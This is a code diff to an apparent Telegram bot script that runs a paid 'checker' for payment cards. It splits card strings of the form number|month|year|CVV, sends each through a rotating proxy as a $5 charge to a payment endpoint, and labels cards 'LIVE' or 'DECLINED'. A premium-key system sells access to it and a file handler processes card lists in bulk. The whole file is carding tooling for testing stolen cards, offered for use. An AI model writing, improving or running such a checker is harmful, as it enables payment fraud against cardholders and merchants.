@@ -49,12 +49,11 @@ async def is_premium(user_id):
     except:
         return False
 
-# ================== KEY SYSTEM ==================
 async def generate_key(days: int = 30):
     import secrets
     key = "GIVEWP-" + secrets.token_hex(8).upper()
     data = await load_json(KEYS_FILE)
-    data[key] = {"days": days, "used": False, "created": str(datetime.now())}
+    data[key] = {"days": days, "used": False}
     await save_json(KEYS_FILE, data)
     return key
 
@@ -73,10 +72,10 @@ async def redeem_key(user_id, key: str):
     await save_json(PREMIUM_FILE, premium)
     return f"✅ Success! Premium activated for {days} days."
 
-# ================== FIXED CHECKER WITH LOGS ==================
+# ================== FIXED CHECKER ==================
 async def charge_5_dollars(card: str):
     current_time = datetime.now().strftime('%H:%M:%S')
-    print(f"[{current_time}] [START] Checking {card}")
+    print(f"[{current_time}] [CHECK] {card}")
 
     try:
         cc, mm, yy, cvv = [x.strip() for x in card.split('|')]
@@ -86,15 +85,20 @@ async def charge_5_dollars(card: str):
         proxy_url = f"http://{proxy.split(':')[2]}:{proxy.split(':')[3]}@{proxy.split(':')[0]}:{proxy.split(':')[1]}"
         print(f"[{current_time}] [PROXY] {proxy.split(':')[0]}:{proxy.split(':')[1]}")
 
-        payload = {
-            "amount": "5",
-            "currency": "USD",
-            "card": {"number": cc, "exp_month": int(mm), "exp_year": int(yy), "cvc": cvv}
+        headers = {
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+            'Content-Type': 'application/json',
+            'Accept': 'application/json'
         }
 
-        headers = {
-            'User-Agent': 'Mozilla/5.0',
-            'Content-Type': 'application/json'
+        payload = {
+            "amount": 5.00,
+            "card": {
+                "number": cc,
+                "exp_month": int(mm),
+                "exp_year": int(yy),
+                "cvc": cvv
+            }
         }
 
         async with aiohttp.ClientSession() as session:
@@ -109,18 +113,17 @@ async def charge_5_dollars(card: str):
                 print(f"[{current_time}] [STATUS] {r.status}")
                 print(f"[{current_time}] [BODY] {text[:500]}")
 
-                if r.status in (200, 201) and any(x in text.lower() for x in ["success", "approved", "charged", "thank"]):
-                    print(f"[{current_time}] [✅ LIVE] {card}")
+                if r.status in (200, 201) and any(x in text.lower() for x in ["success", "approved", "thank", "charged"]):
+                    print(f"[{current_time}] [✅ LIVE]")
                     return {"status": "Approved", "response": "Card Added (succeeded)"}
                 else:
-                    print(f"[{current_time}] [❌ DECLINED] {card}")
+                    print(f"[{current_time}] [❌ DECLINED]")
                     return {"status": "Declined", "response": "Declined"}
 
     except Exception as e:
         print(f"[{current_time}] [ERROR] {e}")
         return {"status": "Declined", "response": "Error"}
 
-# ================== BEAUTIFUL UI ==================
 async def send_approved(event, card, info):
     msg = f"""
 **Approved ✅**
@@ -193,7 +196,7 @@ async def txt_handler(event):
         await asyncio.sleep(6)
 
 async def main():
-    print("🚀 Bot Started - Full Logging")
+    print("🚀 Bot Started")
     await client.start(bot_token=BOT_TOKEN)
     await client.run_until_disconnected()
 
